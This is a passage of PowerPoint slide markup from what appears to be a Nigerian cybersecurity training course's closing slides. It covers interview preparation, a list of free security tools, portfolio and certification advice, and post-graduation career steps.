              <a:t>12 lab platforms. 12 modules. 1 career-changing certificate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Verifiable anywhere in the world. Instantly.</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WHAT EMPLOYERS TEST IN INTERVIEWS</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CYBERSECURITY INTERVIEWS — WHAT THEY ACTUALLY ASSESS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>TECHNICAL ROUND:                    PRACTICAL ROUND:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Explain how SQL injection works   □ Here's a PCAP — find the attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ What's the difference between     □ What's wrong with this code?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IDS and IPS?                      □ Set up these firewall rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ How would you respond to a</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ransomware alert at 3 AM?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>KNOWLEDGE ROUND:                    SOFT SKILLS ROUND:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ What's the OWASP Top 10?         □ Explain XSS to a non-technical CFO</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ What is Zero Trust?              □ You find a critical vulnerability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ What are the NDPA 2023             before going live — what do you do?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>breach notification requirements? □ How do you handle a colleague who</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>bypasses security controls?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>This course prepares you for ALL FOUR types.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>After the capstone, you have evidence to show, not just knowledge to cite.</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TOOLS YOU'LL MASTER</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YOUR PROFESSIONAL TOOLKIT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ANALYSIS &amp; TESTING              NETWORK SECURITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Kali Linux (500+ tools)         Wireshark (packet analysis)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Burp Suite Community            Nmap (port/service scanning)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>OWASP ZAP (web scanner)         Shodan (internet reconnaissance)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Metasploit Framework            iptables / UFW (firewall config)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MALWARE ANALYSIS                CRYPTOGRAPHY &amp; OSINT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ANY.RUN (sandbox)               CyberChef (decode/encrypt)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VirusTotal (multi-AV scan)      crt.sh (certificate transparency)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CyberChef (deobfuscation)       Have I Been Pwned (breach check)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>LEARNING &amp; PRACTICE             REFERENCE TEXTBOOK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>TryHackMe                       Cybersecurity Sefer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HackTheBox (post-course)        metabridgeacademy.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>OWASP WebGoat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>OWASP DVWA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ALL TOOLS: FREE OR OPEN SOURCE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Your lab is your laptop.</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BUILDING YOUR SECURITY PORTFOLIO</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FROM STUDENT TO PROFESSIONAL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>YOUR PORTFOLIO SHOULD INCLUDE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ MetaBridge blockchain certificate (verifiable link)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ TryHackMe profile (show rooms completed, rank achieved)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Capstone project write-up on GitHub</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ CTF (Capture The Flag) competition write-ups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Penetration test lab reports (from authorised TryHackMe/HackTheBox)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Any bug bounty findings (even informational — shows you tried)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>YOUR LINKEDIN HEADLINE:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Cybersecurity Professional | CompTIA Security+ | MetaBridge Certified</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Penetration Testing | Incident Response | Kali Linux"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>NEXT CERTIFICATIONS TO TARGET:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CompTIA Security+ → CySA+ → CEH → OSCP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>JOIN:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ngCERT community (ng-cert.gov.ng)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>LinkedIn cybersecurity groups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ISACA Nigeria chapter</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YOUR ROLE IN NIGERIA'S DIGITAL FUTURE</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THE MISSION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nigeria is building a digital economy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>₦12 trillion flows through NIBSS monthly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>220 million mobile connections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>50+ million Nigerians on mobile banking.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Government digitisation accelerating.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ALL OF IT IS BEING TARGETED.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>The deficit of trained cybersecurity professionals</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>in Nigeria is enormous.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>YOU are the answer to that deficit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Every MetaBridge cybersecurity professional who:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Protects a Nigerian fintech or bank</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Responds to an incident with competence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Trains employees to spot phishing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Builds a security culture in a Nigerian organisation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>...is building the digital immune system of a nation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>This is not a small thing.</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CONTINUING YOUR JOURNEY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="274320" y="1005840"/>
            <a:ext cx="11612880" cy="5486400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WHAT HAPPENS AFTER GRADUATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IMMEDIATELY:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Download and claim your blockchain certificate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Complete your capstone project (if not done)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Update LinkedIn with MetaBridge certification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Create/update TryHackMe profile</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Register for CompTIA Security+ study</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IN 30–60 DAYS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Apply to entry-level SOC or security analyst roles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Complete 10+ TryHackMe rooms for portfolio</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Register for a local security Meetup or ngCERT events</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Start CompTIA Security+ exam prep (SY0-701)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IN 3–6 MONTHS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ CompTIA Security+ exam</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ First professional security role</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Begin building specialisation (pentest? SOC? GRC?)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>IN 1–2 YEARS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ CEH or CySA+ certification</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Senior analyst or specialist role</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Consider OSCP (the pinnacle of practical pentesting)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
